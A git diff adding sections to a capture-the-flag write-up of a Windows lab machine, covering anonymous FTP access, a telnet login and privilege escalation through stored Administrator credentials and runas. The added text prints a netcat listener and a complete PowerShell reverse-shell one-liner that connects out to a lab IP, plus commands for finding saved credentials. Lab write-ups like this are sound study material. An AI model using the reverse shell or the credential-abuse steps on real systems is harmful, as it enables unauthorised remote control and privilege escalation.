@@ -44,6 +44,7 @@ That FTP server looks very interesting as it appears we have anonymous access. H
 
 I then turned my attention toward the FTP server, logging in as Anonymous and without a password. This seems like a very strong lead, as we are able to find a `backup.mdb` file and a `Access Control.zip` archive.
 <img width="478" height="331" alt="image" src="https://github.com/user-attachments/assets/31bd98f0-57d5-4fd9-a88e-c9afd7387bc6" />
+
 _FTP server with .mdb and .zip files_
 
 Due to the types of files we are transferring, I first switched the FTP transfer mode to binary using the command `binary`. The files were then transferred via the `get` command.
@@ -77,6 +78,31 @@ John
 
 These credentials get us into the machine via telnet, where we are then able to grab the user.txt flag.
 <img width="376" height="277" alt="image" src="https://github.com/user-attachments/assets/1633a755-740b-468a-9e69-deec71982755" />
+
 _Using the found credentials to get a telnet session and retrieve user.txt_
 
 # Solving root.txt
+For whatever reason, I spent too much time here getting annoyed at the telnet shell (not being able to backspace for one) before realizing that I should just upgrade to a better shell via a reverse shell. After some inital enumeration, I eventually setup a reverse shell from the Security user, making my life a little bit easier.
+```
+nc -lvnp 4445
+```
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+As I enumerated the machine for possible privilege escalation vectors, I took note of the fact that there seemed to be some group policy in play that was whitelisting apps and executables, making it more difficult to run enumeration tools from the Security user. Eventually, I ran the `cmdkey /list` command and found that there are stored Administrator credentials, something that very easily escalate our privileges, often by using the `runas.exe` utility.
+<img width="426" height="148" alt="image" src="https://github.com/user-attachments/assets/ff19d106-439c-4cf6-9235-b0d803557641" />
+
+_Administrator credentials stored in the Windows Credential Manager_
+
+It should be noted that it took me a bit of time to run the necessary command to spot these credentials. That said, had I noticed that there is a `ZKAccess3.5 Security System.lnk` file in the `C:\Users\Public\Desktop\` directory, it may have gone a bit faster. It is possible to pull strings out of .lnk files to see what kind of information they have. Running a command like the following would let us know that we should be looking to use the `runas.exe` command to use stored Admin credentials: `findstr /R /N "." "ZKAccess3.5 Security System.lnk"`.
+```http highlight-manual
+1:L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?M?:*wWindowsV1MV?System32???:?MV?*?System32X2P?:?
+                                                                                                          runas.exe???:1??:1?*Yrunas.exeL-K??E?§§C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"§§'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
+                                                                                                                                 ?wN??]N?D.??Q???`?Xaccess?_???8{E?3
+      O?j)?H???
+               )??[?_???8{E?3
+                             O?j)?H???
+                                      )??[?     ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
+```
+
